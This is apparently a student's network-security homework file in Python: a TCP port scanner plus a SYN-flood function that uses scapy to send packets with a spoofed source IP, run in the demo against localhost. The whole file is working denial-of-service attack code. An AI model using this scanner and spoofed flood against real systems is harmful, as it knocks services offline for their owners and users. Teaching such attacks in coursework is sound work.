#!/usr/bin/env python3

# Homework Number: 8
# Name: Owen Graffis
# ECN Login: ograffis
# Due Date: 03/26/20

import sys, socket
import os
import re
from scapy.all import *
from scapy.layers.inet import IP, TCP


class TcpAttack:
    #spoofIP: String containing the IP address to spoof
    #targetIP: String containing the IP address of the target computer to attack
    def __init__(self,spoofIP,targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP
        self.open_ports = []

    # rangeStart: Integer designating the first port in the range of ports being scanned.
    # rangeEnd: Integer designating the last port in the range of ports being scanned
    # No return value, but writes open ports to openports.txt
    def scanTarget(self, rangeStart, rangeEnd):

        verbosity = False

        for testport in range(rangeStart, rangeEnd + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            try:
                sock.connect((self.targetIP, testport))
                self.open_ports.append(testport)
                if verbosity: print(testport)
            except:
                if verbosity: print("Port closed: ", testport)

        FILEOUT = open('openports.txt', 'w')


        for i in range(len(self.open_ports)):
            FILEOUT.write(str(self.open_ports[i]))
            if i != len(self.open_ports) - 1:
                FILEOUT.write('\n')
        FILEOUT.close()


    # port: Integer designating the port that the attack will use
    # numSyn: Integer of SYN packets to send to target IP address at the given port
    # If the port is open, perform DoS attack and return 1. Otherwise return 0.

    def attackTarget(self, port, numSyn):

        if port not in self.open_ports: raise ValueError("Port Not Open")

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(.1)  # socket time out for attempted connections

        # attempt to connect to the port
        result = sock.connect_ex((self.targetIP, port))

        # connect_ex will return a 0 if the port is open
        if result != 0: return 0

        for i in range(numSyn):

            IP_header = IP(src=self.spoofIP, dst=self.targetIP)
            TCP_header = TCP(flags="S", sport=RandShort(), dport=port)
            packet = IP_header / TCP_header
            try:
                send(packet)
            except Exception as e:
                print(e)

        return 1

if __name__ == "__main__":
    srcIP = '10.0.0.16'
    destIP = '127.0.0.1'
    rangeStart = 0
    rangeEnd = 632
    port = 631
    Tcp = TcpAttack(srcIP, destIP)
    Tcp.scanTarget(rangeStart, rangeEnd)
    if Tcp.attackTarget(port, 10):
        print('port: {} was open to attack'.format(port))